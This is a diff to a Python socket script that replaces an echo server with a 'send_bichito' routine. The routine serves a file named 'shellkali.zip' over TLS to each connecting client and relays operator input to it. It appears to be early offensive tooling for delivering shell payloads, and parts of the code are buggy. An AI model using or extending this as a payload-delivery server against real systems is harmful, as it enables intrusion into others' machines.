@@ -41,6 +41,44 @@ def echo_client(s):
     s.close()
 
 
+def open_encode_bichito(file_name='shell.exe'):
+    # create_bichito()
+    bichito = open(file_name, 'rb')
+    # return encode(file.read())
+    return bichito
+
+
+def send_bichito(address):
+    s = socket.socket(AF_INET, SOCK_STREAM)
+    s.bind(address)
+    s.listen(1)
+    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+
+    s_ssl = ssl.wrap_socket(s, 
+                            keyfile=KEYFILE,
+                            certfile=CERTFILE, 
+                            server_side=True)
+
+    while True:
+        try:
+            (c,a) = s_ssl.accept()
+            print('Got connection', a)
+            print('Sending bichito...')
+            while 1:
+                filename='shellkali.zip'
+                f = open(filename,'rb')
+                l = f.read(8192)
+                while (l):
+                    c.send(l)
+                    l = f.read(8192)
+                f.close()
+                c.write(str(input("Enter Something: ")).encode())
+            # echo_client(c)
+        except socket.error as e:
+            print('Error: {0}'.format(e))
+
+
+
 def echo_server(address):
     s = socket.socket(AF_INET, SOCK_STREAM)
     s.bind(address)
@@ -66,7 +104,8 @@ def echo_server(address):
 def main():
     create_config_file_json()
     config_data = get_json_data('config_w.json')
-    echo_server((socket.gethostbyname(config_data['ip']), config_data['port']))
+    send_bichito((socket.gethostbyname(config_data['ip']), config_data['port']))
+    # echo_server((socket.gethostbyname(config_data['ip']), config_data['port']))
 
 
 if __name__ == "__main__":
